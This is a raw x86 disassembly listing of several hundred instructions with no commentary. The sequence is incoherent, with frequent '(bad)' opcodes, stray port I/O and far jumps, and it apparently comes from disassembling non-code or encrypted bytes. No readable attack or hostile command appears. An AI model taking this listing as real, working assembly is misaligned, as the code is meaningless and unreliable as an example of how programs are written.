  412812:	pop    ebp
  412813:	gs push 0xffffffe9
  412816:	(bad)  
  412817:	xchg   esp,eax
  412818:	mov    ecx,esi
  41281a:	rcr    BYTE PTR [ebp+0x251fb399],cl
  412820:	stos   BYTE PTR es:[edi],al
  412821:	fiadd  DWORD PTR [esi+0x1c2fbe3a]
  412827:	test   edi,eax
  412829:	mov    BYTE PTR [ecx],cl
  41282b:	jecxz  0x412870
  41282d:	inc    esp
  41282e:	imul   ebx,DWORD PTR [ebp-0x7e5b997],0xdf3cd11
  412838:	dec    esi
  412839:	fwait
  41283a:	test   BYTE PTR [edi+edi*1-0x30],dl
  41283e:	push   0xc875e837
  412843:	jno    0x4128c4
  412845:	xchg   ebx,edi
  412847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412848:	lea    edx,[ebp-0x54]
  41284b:	icebp  
  41284c:	mov    DWORD PTR [eax],esi
  41284e:	xor    ecx,0x21f530e4
  412854:	xchg   DWORD PTR [ebx-0x6],ecx
  412857:	icebp  
  412858:	push   0xffffffcd
  41285a:	xchg   edx,eax
  41285b:	outs   dx,DWORD PTR ds:[esi]
  41285c:	push   eax
  41285d:	sub    BYTE PTR [edi-0x2a],bh
  412860:	pushf  
  412861:	shl    ecx,0xde
  412864:	in     al,dx
  412865:	in     eax,dx
  412866:	xor    DWORD PTR [ebp+0x2789fc6b],eax
  41286c:	push   esp
  41286d:	add    ebp,DWORD PTR [ebp+0xc]
  412870:	jo     0x412898
  412872:	cs push 0xffffffc8
  412875:	jb     0x4128b9
  412877:	cmp    BYTE PTR [edx+0x3c],al
  41287a:	add    BYTE PTR [edx+0x37294832],0x28
  412881:	lahf   
  412882:	mov    al,0x12
  412884:	lahf   
  412885:	scas   eax,DWORD PTR es:[edi]
  412886:	mov    al,0xd1
  412888:	xchg   BYTE PTR [ecx+0x5901f4d3],dl
  41288e:	pop    es
  41288f:	pop    es
  412890:	jecxz  0x412835
  412892:	lahf   
  412893:	mov    eax,0x879cb70b
  412898:	mov    esi,0xb4aab446
  41289d:	sbb    BYTE PTR [ebp-0x3ef2d528],cl
  4128a3:	cmp    al,0xfe
  4128a5:	bound  ecx,QWORD PTR [ebx+0x4aea9980]
  4128ab:	jno    0x4128ac
  4128ad:	sub    bh,BYTE PTR [edi]
  4128af:	jb     0x412870
  4128b1:	idiv   BYTE PTR [eax]
  4128b3:	push   0x4f2f734
  4128b8:	jp     0x4128b7
  4128ba:	mov    edx,DWORD PTR ds:0x512cdea8
  4128c0:	loopne 0x412869
  4128c2:	test   BYTE PTR [eax+ebx*8-0x6edf6b76],ch
  4128c9:	push   0x14
  4128cb:	inc    ebx
  4128cc:	sbb    cl,cl
  4128ce:	push   ebp
  4128cf:	add    DWORD PTR [edx+eax*2+0x3e],edi
  4128d3:	sbb    DWORD PTR [ecx],eax
  4128d5:	push   0xffffffb9
  4128d7:	add    BYTE PTR [ebp-0x71],bh
  4128da:	mov    ecx,0xd73339ab
  4128df:	mov    dl,0xeb
  4128e1:	inc    eax
  4128e2:	fwait
  4128e3:	push   0xaae80ee1
  4128e8:	and    ch,BYTE PTR [edx]
  4128ea:	mov    WORD PTR [ebp+0x29],?
  4128ed:	sbb    eax,0xf5699f1b
  4128f2:	or     DWORD PTR [edi+edi*1-0x3c],edi
  4128f6:	ficomp DWORD PTR [edi]
  4128f8:	mov    ecx,0x2cbf11e6
  4128fd:	jl     0x4128c1
  4128ff:	jae    0x4128eb
  412901:	or     eax,0x77591b53
  412906:	push   ebp
  412907:	nop
  412908:	pop    edi
  412909:	push   cs
  41290a:	adc    dh,cl
  41290c:	shr    dl,0x9
  41290f:	data16 sbb BYTE PTR [ecx+0x46874f4f],bh
  412916:	outs   dx,BYTE PTR ds:[esi]
  412917:	ins    BYTE PTR es:[edi],dx
  412918:	int3   
  412919:	inc    DWORD PTR [edi+0x18]
  41291c:	xchg   ebp,eax
  41291d:	jmp    0x4128dd
  41291f:	jno    0x4128ba
  412921:	(bad)  
  412922:	cmp    eax,esi
  412924:	lds    ecx,FWORD PTR [ecx-0x4ca24fbf]
  41292a:	pop    edx
  41292b:	xlat   BYTE PTR ds:[ebx]
  41292c:	mov    bh,ch
  41292e:	sar    dl,1
  412930:	jbe    0x412966
  412932:	xor    edi,ebx
  412934:	outs   dx,DWORD PTR ds:[esi]
  412935:	mov    bl,0xc8
  412937:	iret   
  412938:	nop
  412939:	lods   al,BYTE PTR ds:[esi]
  41293a:	arpl   cx,di
  41293c:	mov    dh,0x3b
  41293e:	lock adc al,0xba
  412941:	xor    esi,DWORD PTR [ebx+0x7a]
  412944:	add    BYTE PTR [edi-0x12c25c73],dh
  41294a:	or     ah,ah
  41294c:	sbb    esp,edx
  41294e:	push   eax
  41294f:	pusha  
  412950:	push   esp
  412951:	out    dx,eax
  412952:	inc    ecx
  412953:	adc    cl,BYTE PTR [ebx+0x674947dc]
  412959:	add    eax,0x90b150b0
  41295e:	in     al,dx
  41295f:	adc    al,0xd3
  412961:	div    BYTE PTR [ecx]
  412963:	lea    esp,[esi+0xc844b45]
  412969:	sub    edi,DWORD PTR [ecx]
  41296b:	ret    
  41296c:	and    al,0xce
  41296e:	xor    al,0xe1
  412970:	ficomp DWORD PTR [ecx+0xa]
  412973:	dec    ebx
  412974:	cwde   
  412975:	mov    ds:0x4887aee2,al
  41297a:	stc    
  41297b:	xchg   ebp,eax
  41297c:	mov    ds:0xed0c8da5,al
  412981:	dec    ch
  412983:	jbe    0x4129ef
  412985:	in     al,dx
  412986:	les    ebp,FWORD PTR [esi+ebx*1-0x2e1105d4]
  41298d:	and    BYTE PTR [ecx+ebx*8+0x4a],ch
  412991:	push   edi
  412992:	fsubr  st(2),st
  412994:	and    ah,BYTE PTR [eax+0x21c74d10]
  41299a:	or     esp,DWORD PTR [edi+edx*8]
  41299d:	cmc    
  41299e:	bound  edx,QWORD PTR [edi-0x1e12c06a]
  4129a4:	mov    eax,0xd125d2e5
  4129a9:	and    BYTE PTR [esi+0x40],ch
  4129ac:	sti    
  4129ad:	jg     0x4129d8
  4129af:	jle    0x41293a
  4129b1:	mov    ds:0xc597d1b4,eax
  4129b6:	push   0x46
  4129b8:	arpl   WORD PTR [esi],di
  4129ba:	ret    0xe29b
  4129bd:	inc    esi
  4129be:	or     DWORD PTR [edi+esi*2],esi
  4129c1:	out    dx,eax
  4129c2:	pop    ebx
  4129c3:	jg     0x412a43
  4129c5:	stc    
  4129c6:	xor    ah,BYTE PTR [eax+0x50]
  4129c9:	push   esi
  4129ca:	mov    ebp,0x6432536f
  4129cf:	add    DWORD PTR gs:[ecx],0x5
  4129d3:	push   edx
  4129d4:	push   es
  4129d5:	jg     0x412982
  4129d7:	add    dh,BYTE PTR [edx-0x5c]
  4129da:	in     eax,dx
  4129db:	ret    
  4129dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129dd:	into   
  4129de:	mov    dl,0x2c
  4129e0:	fcmovnu st,st(3)
  4129e2:	push   esp
  4129e3:	lds    esi,FWORD PTR [esi]
  4129e5:	iret   
  4129e6:	je     0x412a2e
  4129e8:	outs   dx,DWORD PTR ds:[esi]
  4129e9:	cmp    al,0xc7
  4129eb:	sbb    eax,ecx
  4129ed:	leave  
  4129ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129ef:	repnz popf 
  4129f1:	arpl   WORD PTR [edx-0xd],si
  4129f4:	sbb    eax,0xbba3af24
  4129f9:	(bad)  
  4129fa:	add    dh,dh
  4129fc:	mov    es,WORD PTR [ecx-0x72]
  4129ff:	cld    
  412a00:	push   cs
  412a01:	cwde   
  412a02:	pop    edi
  412a03:	loop   0x41299b
  412a05:	(bad)
  412a08:	xchg   BYTE PTR [edx-0x15],al
  412a0b:	mov    edx,0xfc14c446
  412a10:	pop    ebx
  412a11:	out    dx,al
  412a12:	jl     0x412a3c
  412a14:	repnz dec ecx
  412a16:	cmc    
  412a17:	xchg   esi,eax
  412a18:	inc    eax
  412a19:	xor    DWORD PTR [ebx-0x34],ebx
  412a1c:	test   eax,0x7b46e10a
  412a21:	sub    al,0x37
  412a23:	lock pop edx
  412a25:	or     dl,BYTE PTR [esp+edx*2+0x5e]
  412a29:	jns    0x412a6c
  412a2b:	retf   
  412a2c:	jns    0x4129ed
  412a2e:	sbb    edx,ebx
  412a30:	add    al,0x60
  412a32:	mov    WORD PTR [eax-0x2f],?
  412a35:	sbb    DWORD PTR [eax+0x29887d00],ecx
  412a3b:	xor    esp,esp
  412a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a3e:	aam    0xc
  412a40:	cmp    BYTE PTR cs:[eax+0x40],0x7c
  412a45:	xchg   ebp,eax
  412a46:	xchg   esp,eax
  412a47:	es push ebp
  412a49:	inc    ecx
  412a4a:	mov    ds:0xa82f03ca,al
  412a4f:	rol    BYTE PTR [edx],0xa9
  412a52:	mov    esp,0x7a3da728
  412a57:	push   es
  412a58:	clc    
  412a59:	xor    ebx,DWORD PTR [eax]
  412a5b:	inc    ecx
  412a5c:	dec    ecx
  412a5d:	sub    ch,BYTE PTR [edx]
  412a5f:	scas   eax,DWORD PTR es:[edi]
  412a60:	fwait
  412a61:	mov    al,0x21
  412a63:	test   DWORD PTR [edx+ebp*8],ebp
  412a66:	inc    ebp
  412a67:	dec    esi
  412a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a69:	inc    ebp
  412a6a:	push   es
  412a6b:	in     eax,dx
  412a6c:	lea    ecx,[ecx+0x8e49ddb]
  412a72:	mov    al,ds:0xe71daf05
  412a77:	cmp    ebx,DWORD PTR [edx+eiz*1-0x61]
  412a7b:	inc    edx
  412a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a7d:	in     eax,0x4b
  412a7f:	test   al,0xf2
  412a81:	push   es
  412a82:	scas   al,BYTE PTR es:[di]
  412a84:	das    
  412a85:	mov    ebx,0x5c4a3cc
  412a8a:	sub    DWORD PTR [edx+0x1],edx
  412a8d:	cmp    eax,0xcf1b2e83
  412a92:	nop
  412a93:	inc    ecx
  412a94:	fsub   QWORD PTR [edx+0x28]
  412a97:	dec    edx
  412a98:	cmp    BYTE PTR [ebx-0x18],dl
  412a9b:	jmp    0x2352e099
  412aa0:	sahf   
  412aa1:	xlat   BYTE PTR ds:[ebx]
  412aa2:	mov    ds:0xc3a0e7fc,al
  412aa7:	and    DWORD PTR cs:0x9e8584f8,edi
  412aae:	jecxz  0x412a4f
  412ab0:	test   BYTE PTR [esi],dh
  412ab2:	fld    DWORD PTR [ebp-0x7b]
  412ab5:	or     edx,eax
  412ab7:	dec    ebx
  412ab8:	cwde   
  412ab9:	jnp    0x412aff
  412abb:	imul   ebp,edx,0xfffffff3
  412abe:	dec    edi
  412abf:	inc    DWORD PTR [esi-0x63a33660]
  412ac5:	mov    edx,0xb25342aa
  412aca:	mov    ah,0x64
  412acc:	loop   0x412a75
  412ace:	pop    eax
  412acf:	enter  0x2a3b,0xf3
  412ad3:	inc    ebx
  412ad4:	loopne 0x412a9a
  412ad6:	stc    
  412ad7:	xor    ch,BYTE PTR [eax]
  412ad9:	test   BYTE PTR [edx-0x30],al
  412adc:	test   ebx,edx
  412ade:	aas    
  412adf:	jo     0x412a92
  412ae1:	sar    DWORD PTR [edx],1
  412ae3:	out    0x23,al
  412ae5:	xchg   edi,eax
  412ae6:	fst    QWORD PTR [edi]
  412ae8:	mov    esi,0x726d207c
  412aed:	push   esi
  412aee:	push   0xffffffd1
  412af0:	(bad)  
  412af1:	dec    edx
  412af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412af3:	mov    al,ds:0x9c828f6a
  412af8:	jg     0x412b19
  412afa:	xor    ah,BYTE PTR [esi+0x3e4cea1a]
  412b00:	push   ecx
  412b01:	fdivr  st,st(7)
  412b03:	imul   al
  412b05:	sbb    eax,0x55c261e0
  412b0a:	xor    esi,DWORD PTR [ecx]
  412b0c:	loopne 0x412b48
  412b0e:	loopne 0x412afb
  412b10:	or     eax,0xda5ec9ab
  412b15:	sbb    DWORD PTR ds:0x94be95d1,ebx
  412b1b:	mov    DWORD PTR [eax-0x54],ecx
  412b1e:	mov    edi,0xd98b3b0f
  412b23:	loop   0x412b7a
  412b25:	cmp    BYTE PTR [ebx],cl
  412b27:	adc    edx,esi
  412b29:	push   edx
  412b2a:	sub    al,0x6c
  412b2c:	or     dl,BYTE PTR [edx-0x63]
  412b2f:	add    ah,dh
  412b31:	adc    al,0xfa
  412b33:	ja     0x412b48
  412b35:	pop    ebp
  412b36:	cs fwait
  412b38:	or     al,0xff
  412b3a:	stos   BYTE PTR es:[edi],al
  412b3b:	jg     0x412b0c
  412b3d:	and    cl,dh
  412b3f:	mov    cl,0xc3
  412b41:	add    edx,DWORD PTR [eax]
  412b43:	jp     0x412b92
  412b45:	call   0x2aa204e9
  412b4a:	fld    TBYTE PTR [edx-0x387593c7]
  412b50:	loope  0x412ba3
  412b52:	ins    BYTE PTR es:[edi],dx
  412b53:	xor    al,0x45
  412b55:	enter  0xd7b4,0x5b
  412b59:	loopne 0x412b69
  412b5b:	sbb    DWORD PTR [edi],ecx
  412b5d:	pop    edi
  412b5e:	popf   
  412b5f:	fimul  WORD PTR [ebx+0x48]
  412b62:	dec    ebx
  412b63:	mov    DWORD PTR [edi],ebx
  412b65:	enter  0xea80,0xca
  412b69:	call   0xc37f:0xc1e895a8
  412b70:	je     0x412b52
  412b72:	push   ebx
  412b73:	repz jle 0x412afe
  412b76:	aaa    
  412b77:	pop    edx
  412b78:	ficomp DWORD PTR [eax*4-0x635db133]
  412b7f:	inc    esi
  412b80:	jns    0x412bcc
  412b82:	stos   DWORD PTR es:[edi],eax
  412b83:	sub    al,dl
  412b85:	xor    al,0xa
  412b87:	sti    
  412b88:	(bad)  
  412b8a:	mov    bl,0xf2
  412b8c:	jle    0x412b41
  412b8e:	fldcw  WORD PTR [eax+0x42]
  412b91:	jmp    0xec825d8
  412b96:	and    al,0x69
  412b98:	sub    DWORD PTR [esi+0x68],ebx
  412b9b:	test   al,0x1d
  412b9d:	mov    dh,0x6b
  412b9f:	mov    esp,0xc2ac9c5
  412ba4:	outs   dx,DWORD PTR ds:[esi]
  412ba5:	mov    eax,0x1385ee6
  412baa:	jmp    0x86632e8
  412baf:	dec    eax
  412bb0:	jb     0x412b41
  412bb2:	sub    BYTE PTR [ecx+0x6],bl
  412bb5:	mov    esi,0xd5d9778c
  412bba:	in     eax,dx
  412bbb:	ja     0x412beb
  412bbd:	xor    al,0xcc
  412bbf:	sbb    al,0x69
  412bc1:	adc    esp,edx
  412bc3:	cmc    
  412bc4:	stos   BYTE PTR es:[edi],al
  412bc5:	js     0x412b74
  412bc7:	jb     0x412be4
  412bc9:	in     eax,0xca
  412bcb:	pop    es
  412bcc:	xor    BYTE PTR [eax+0x3b],0xcf
  412bd0:	in     al,0x36
  412bd2:	leave  
  412bd3:	push   es
  412bd4:	push   cs
  412bd5:	mov    ds:0x97803c16,al
  412bda:	jmp    0xefe0:0xaee2c0da
  412be1:	and    eax,0x72ca1df1
  412be6:	pop    ebx
  412be7:	sbb    dl,BYTE PTR [esi-0x650622cf]
  412bed:	push   es
  412bee:	pop    ebx
  412bef:	shr    BYTE PTR [esi],0xd5
  412bf2:	das    
  412bf3:	sbb    BYTE PTR [ebp+eax*8+0x28],0x51
  412bf8:	stc    
  412bf9:	faddp  st(7),st
  412bfb:	call   0x2c3c:0x3ff1b57a
  412c02:	or     cl,BYTE PTR [esp+esi*4-0x4a]
  412c06:	mov    eax,ds:0x114ca658
  412c0b:	push   ds
  412c0c:	ds cs das 
  412c0f:	pop    ecx
  412c10:	les    ebx,FWORD PTR ds:0xe7f6ddf7
  412c16:	fsubr  DWORD PTR [edx+esi*4]
  412c19:	fidivr DWORD PTR [edx]
  412c1b:	xchg   edx,eax
  412c1c:	test   eax,esi
  412c1e:	mov    ds:0x96e7e9bd,al
  412c23:	sub    bl,dl
  412c25:	push   cs
  412c26:	popf   
  412c27:	fadd   DWORD PTR [edx]
  412c29:	push   0xffffffdd
  412c2b:	push   ebp
  412c2c:	imul   esp,DWORD PTR [edx+0x7f],0xffffff81
  412c30:	mov    esp,0xe73f6aec
  412c35:	xlat   BYTE PTR ds:[ebx]
  412c36:	int    0xda
  412c38:	scas   al,BYTE PTR es:[edi]
  412c39:	push   esi
  412c3a:	jae    0x412c8a
  412c3c:	xor    dh,bh
  412c3e:	pusha  
  412c3f:	mov    WORD PTR ds:0x3296d98d,ss
  412c45:	leave  
  412c46:	adc    BYTE PTR [ecx+eiz*1-0x38],dl
  412c4a:	sub    eax,0x599a97cc
  412c4f:	loope  0x412cab
  412c51:	mov    bh,0xea
  412c53:	mov    bl,0x8b
  412c55:	mov    ah,0x95
  412c57:	jg     0x412c1e
  412c59:	cmp    esp,DWORD PTR [esi]
  412c5b:	mov    ecx,0x37511bd
  412c60:	inc    esp
  412c61:	ins    BYTE PTR es:[edi],dx
  412c62:	mov    esp,0x70160875
  412c67:	mov    bh,0xd5
  412c69:	scas   al,BYTE PTR es:[edi]
  412c6a:	and    ch,0x5
  412c6d:	push   ss
  412c6e:	std    
  412c6f:	xor    edi,DWORD PTR [ebx+0x18ab944f]
  412c75:	fs jl  0x412ca6
  412c78:	(bad)
  412c7b:	fstp   DWORD PTR [esi-0x6e]
  412c7e:	add    ch,ah
  412c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c81:	or     eax,0xfb8c1303
  412c86:	jns    0x412cec
  412c88:	aam    0xea
  412c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c8b:	xchg   ecx,eax
  412c8c:	sbb    bh,BYTE PTR [ebx+0x2baaf29d]
  412c92:	(bad)
  412c95:	les    eax,FWORD PTR [ecx]
  412c97:	inc    ecx
  412c98:	cmp    eax,0x58036159
  412c9d:	push   es
  412c9e:	popa   
  412c9f:	mov    edi,0x1aeda660
  412ca4:	add    BYTE PTR [edx-0x30],0x3e
  412ca8:	jge    0x412c87
  412caa:	or     al,0x7e
  412cac:	sub    BYTE PTR [esi],ah
  412cae:	add    BYTE PTR ds:0xa3b650fe,0xa8
  412cb5:	sbb    esp,DWORD PTR [eax+0x3210e3c6]
  412cbb:	sahf   
  412cbc:	retf   
  412cbd:	cdq    
  412cbe:	(bad)  
  412cbf:	shl    dl,cl
  412cc1:	retf   0xa78f
  412cc4:	xchg   BYTE PTR [esi+0x20430717],ch
  412cca:	and    eax,0xc1231974
  412ccf:	(bad)  
  412cd0:	adc    al,0x2d
  412cd2:	retf   0xff17
  412cd5:	cs sahf 
  412cd7:	add    DWORD PTR [eax+edx*1],ecx
  412cda:	or     eax,0xb67d9d75
  412cdf:	fdivr  st(1),st
  412ce1:	jge    0x412c7b
  412ce3:	xor    al,0x9c
  412ce5:	cld    
  412ce6:	pop    edx
  412ce7:	cmp    ebx,DWORD PTR [bx+si+0x4239]
  412cec:	bound  edx,QWORD PTR ds:0xc8d8162d
  412cf2:	inc    edi
  412cf3:	loop   0x412d04
  412cf5:	div    cl
  412cf7:	and    BYTE PTR [edi],al
  412cf9:	les    esp,FWORD PTR [ebp-0x750f6c51]
  412cff:	retf   0x9765
  412d02:	cs push eax
  412d04:	dec    esi
  412d05:	or     ebp,ebp
  412d07:	mov    edx,0xba57399b
  412d0c:	out    0x66,eax
  412d0e:	xchg   DWORD PTR [ebx-0x35],ecx
  412d11:	enter  0x5e12,0xd0
  412d15:	aas    
  412d16:	ret    
  412d17:	mov    esi,0xccb350a2
  412d1c:	lock ret 
  412d1e:	cs mov esi,0x72f55af1
  412d24:	loop   0x412d46
  412d26:	or     ecx,edi
  412d28:	imul   edx,DWORD PTR [edi+ecx*1],0xa
  412d2c:	inc    edx
  412d2d:	and    edx,DWORD PTR [edi]
  412d2f:	ror    cl,1
  412d31:	cmp    BYTE PTR [ebx],dl
  412d33:	jnp    0x412cd6
  412d35:	push   edi
  412d36:	shl    DWORD PTR [edi],1
  412d38:	popf   
  412d39:	mov    dl,BYTE PTR [ebp+esi*2+0x3bbfd65d]
  412d40:	mov    ds:0x97d8971b,al
  412d45:	daa    
  412d46:	xchg   ecx,eax
  412d47:	sbb    esp,esi
  412d49:	pop    ss
  412d4a:	xchg   ch,bl
  412d4c:	xchg   BYTE PTR [edx],bl
  412d4e:	fistp  DWORD PTR [edx+ebp*4]
  412d51:	popf   
  412d52:	pop    edx
  412d53:	sbb    eax,0x91d30a4e
  412d58:	enter  0x383b,0x5d
  412d5c:	rcr    dl,cl
  412d5e:	hlt    
  412d5f:	mov    DWORD PTR [esi],esi
  412d61:	addr16 (bad) 
  412d63:	std    
  412d64:	test   al,0x1f
  412d66:	lods   eax,DWORD PTR ds:[esi]
  412d67:	pop    ebx
  412d68:	mov    DWORD PTR [edi+eiz*2-0x1cecc0e],edx
  412d6f:	adc    bh,dh
  412d71:	popa   
  412d72:	adc    al,0xc0
  412d74:	aad    0xfa
  412d76:	jnp    0x412dc1
  412d78:	hlt    
  412d79:	rcr    BYTE PTR [ebp+0x51395da4],0xeb
  412d80:	mov    ah,0xcc
  412d82:	mov    ch,0x49
  412d84:	or     DWORD PTR [ebp-0x3],eax
  412d87:	ds dec ecx
  412d89:	xchg   ebx,eax
  412d8a:	dec    ebp
  412d8b:	out    dx,eax
  412d8c:	xchg   edx,eax
  412d8d:	stc    
  412d8e:	je     0x412d50
  412d90:	mov    ds:0xc5824d21,al
  412d95:	mov    edi,DWORD PTR [ebp+0x19]
  412d98:	mov    ebp,0x54b9e511
  412d9d:	pop    ecx
  412d9e:	xchg   edi,eax
  412d9f:	jecxz  0x412dec
  412da1:	loopne 0x412d5b
  412da3:	push   esp
  412da4:	inc    esp
  412da5:	ins    BYTE PTR es:[edi],dx
  412da6:	push   edi
  412da7:	add    esi,DWORD PTR [ebx+0x2a]
  412daa:	xor    BYTE PTR [eax-0x3b],0x88
  412dae:	scas   al,BYTE PTR es:[edi]
  412daf:	push   esp
  412db0:	fild   QWORD PTR [eax]
  412db2:	pop    ds
  412db3:	jne    0x412d7e
  412db5:	push   0x12f572f2
  412dba:	xchg   esi,eax
  412dbb:	xor    edi,DWORD PTR [ebx]
  412dbd:	cmp    BYTE PTR ds:0xe77e116b,0x49
  412dc4:	xor    eax,0xf18154e2
  412dc9:	sub    al,0xc5
  412dcb:	cmp    eax,0x6024ca83
  412dd0:	ja     0x412d5c
  412dd2:	sbb    BYTE PTR [eax],cl
  412dd4:	pop    edi
  412dd5:	daa    
  412dd6:	fst    DWORD PTR [ecx-0x3]
  412dd9:	outs   dx,DWORD PTR ds:[esi]
  412dda:	mov    ds:0x48ddcc6c,al
  412ddf:	sub    BYTE PTR [edx-0x37cf9574],ch
  412de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412de6:	(bad)  
  412de7:	cmc    
  412de8:	scas   eax,DWORD PTR es:[edi]
  412de9:	and    eax,DWORD PTR [ecx]
  412deb:	pop    edx
  412dec:	test   eax,0xbb0ea903
  412df1:	push   esi
  412df2:	cmp    al,0xac
  412df4:	aam    0x93
  412df6:	aaa    
  412df7:	sbb    bl,cl
  412df9:	xchg   edi,eax
  412dfa:	mov    eax,ds:0xd5f735f8
  412dff:	leave  
  412e00:	xlat   BYTE PTR ds:[bx]
  412e02:	cmp    al,0x7e
  412e04:	mov    ds:0x1d223487,eax
  412e09:	mov    al,ds:0xd9f439b4
  412e0e:	ds (bad) 
  412e10:	push   edi
  412e11:	clc    
  412e12:	push   0x5
  412e14:	stos   BYTE PTR es:[edi],al
  412e15:	sbb    edx,DWORD PTR [ebx+0x2f5d1f0b]
  412e1b:	lds    ebx,FWORD PTR [edx-0x4509b952]
  412e21:	xchg   DWORD PTR [eax],ebx
  412e23:	push   esi
  412e24:	push   eax
  412e25:	mov    cs,WORD PTR ds:0x2b270dbf
  412e2b:	clc    
  412e2c:	repz in al,0x8e
  412e2f:	push   edi
  412e30:	dec    ebx
  412e31:	ror    esp,0xdb
  412e34:	mov    ds:0x1abba125,eax
  412e39:	push   0x43b6cd95
  412e3e:	daa    
  412e3f:	xor    al,0xda
  412e41:	pop    ebx
  412e42:	in     al,0x63
  412e44:	mov    bl,BYTE PTR [ebx-0x1841d2bb]
  412e4a:	push   edx
  412e4b:	aas    
  412e4c:	in     al,0xf6
  412e4e:	mov    esi,0xde89a52f
  412e53:	push   0xffffffda
  412e55:	or     DWORD PTR [esi+0x11],eax
  412e58:	push   ebp
  412e59:	enter  0x9247,0xbd
  412e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e5e:	inc    eax
  412e5f:	dec    edi
  412e60:	test   BYTE PTR [edi+0x64],dh
  412e63:	jno    0x412e23
  412e65:	repnz xor BYTE PTR [edx-0x7f],bl
  412e69:	add    eax,0x281352f9
  412e6e:	fwait
  412e6f:	jmp    0x412e5c
  412e71:	xor    eax,0xc790f83a
  412e76:	scas   eax,DWORD PTR es:[edi]
  412e77:	jo     0xd53df3bb
  412e7d:	or     DWORD PTR [esi],edx
  412e7f:	adc    cl,BYTE PTR [ebp+edx*1-0x7c146652]
  412e86:	stc    
  412e87:	or     DWORD PTR [edx+0x295438d6],0x629266a3
  412e91:	mov    ds:0xb639fd1b,eax
  412e96:	mov    edi,0x8795739c
  412e9b:	inc    ebp
  412e9c:	addr16 aaa 
  412e9e:	adc    ch,ah
  412ea0:	sub    DWORD PTR [edx],0xffffff89
  412ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea4:	and    DWORD PTR [ecx-0x74d8738e],ebx
  412eaa:	cmp    DWORD PTR [eax],0x6a
  412ead:	jne    0x412ed9
  412eaf:	xor    BYTE PTR [esi+0x7d544e33],0x11
  412eb6:	inc    edi
  412eb7:	loop   0x412f0d
  412eb9:	ret    0xfe81
  412ebc:	mov    ebp,0xb4bcd0df
  412ec1:	stc    
  412ec2:	push   esp
  412ec3:	adc    DWORD PTR [ecx],eax
  412ec5:	icebp  
  412ec6:	push   ebp
  412ec7:	jnp    0x412f3e
  412ec9:	mov    ?,WORD PTR [esi-0x20]
  412ecc:	xor    eax,0x497d9a7c
  412ed1:	sar    BYTE PTR [edx+0x51],cl
  412ed4:	aad    0x7
  412ed6:	push   esi
  412ed7:	push   0xffffff8a
  412ed9:	mov    esp,DWORD PTR [ecx-0x16]
  412edc:	call   0x51eb:0x5825a405
  412ee3:	enter  0x5269,0x5f
  412ee7:	xchg   esi,eax
  412ee8:	xchg   esp,eax
  412ee9:	push   ebx
  412eea:	mov    dl,0x93
  412eec:	mov    BYTE PTR [eax-0x7a],al
  412eef:	loopne 0x412e86
  412ef1:	call   0x70275210
  412ef6:	repz dec eax
  412ef8:	scas   eax,DWORD PTR es:[edi]
  412ef9:	or     BYTE PTR [esi+0x4aeef2cb],0x45
  412f00:	mov    ebx,0xe1fe5643
  412f05:	loop   0x412ebe
  412f07:	jo     0x412f00
  412f09:	std    
  412f0a:	cmp    eax,0x1a53f64e
  412f0f:	mov    esi,0xbfaa787a
  412f14:	mov    eax,0x333c77e
  412f19:	outs   dx,BYTE PTR ds:[esi]
  412f1a:	clc    
  412f1b:	jg     0x412f31
  412f1d:	and    eax,0x3ec9120f
  412f22:	push   0xc1bddf36
  412f27:	and    BYTE PTR [ecx-0x59137a56],dh
  412f2d:	fstp   TBYTE PTR [eax+0x3]
  412f30:	push   eax
  412f31:	stc    
  412f32:	aam    0x8e
  412f34:	imul   esi,DWORD PTR ds:0x4c35f6ca,0x1a
  412f3b:	fisubr DWORD PTR [ecx+0x6bba2533]
  412f41:	lock imul esi,esi,0xfffffff8
  412f45:	(bad)  
  412f46:	in     eax,dx
  412f47:	sub    bl,bl
  412f49:	sar    DWORD PTR [edx-0x68b312a0],1
  412f4f:	retf   0x32db
  412f52:	hlt    
  412f53:	jo     0x412f43
  412f55:	popf   
  412f56:	jle    0x412f4e
  412f58:	clc    
  412f59:	ins    BYTE PTR es:[edi],dx
  412f5a:	push   ds
  412f5b:	test   DWORD PTR [ebp-0x2ee54c5e],esp
  412f61:	mov    ecx,0xa5a7d8ab
  412f66:	cmp    DWORD PTR [ebp-0x71],ebx
  412f69:	out    dx,eax
  412f6a:	jecxz  0x412f17
  412f6c:	leave  
  412f6d:	mov    ebx,0x2a353f45
  412f72:	sub    ebx,DWORD PTR [ebp-0xcb9e68c]
  412f78:	retf   
  412f79:	add    esi,DWORD PTR [ebx+0x72]
  412f7c:	fdiv   QWORD PTR ss:[ebp-0x27]
  412f80:	xor    DWORD PTR [ebx],edi
  412f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f83:	cmp    ah,bh
  412f85:	mov    ds:0xe6bf4370,eax
  412f8a:	jg     0x412f38
  412f8c:	xor    ebx,DWORD PTR [ebp+0x2e]
  412f8f:	in     eax,dx
  412f90:	push   esp
  412f91:	and    BYTE PTR [ebp-0x12],0xe
  412f95:	lds    esi,FWORD PTR [esi+0x95ccc6f]
  412f9b:	(bad)  
  412f9c:	test   eax,0x4d0e0ec1
  412fa1:	mov    dl,bh
  412fa3:	gs dec ecx
  412fa5:	or     al,0xe
  412fa7:	jp     0x412fda
  412fa9:	popf   
  412faa:	mov    ecx,0x9294de5d
  412faf:	jg     0x412f68
  412fb1:	and    BYTE PTR [ebx+0x23],0xd
  412fb5:	xor    edx,DWORD PTR [eax-0x29]
  412fb8:	pop    es
  412fb9:	cli    
  412fba:	shl    BYTE PTR [edx-0x18],0x74
  412fbe:	adc    DWORD PTR [edi],eax
  412fc0:	or     DWORD PTR [esi-0x35],eax
  412fc3:	mov    WORD PTR [ecx-0x4e],gs
  412fc6:	adc    al,0x4e
  412fc8:	xchg   si,ax
  412fca:	mov    ecx,0x25fa5de9
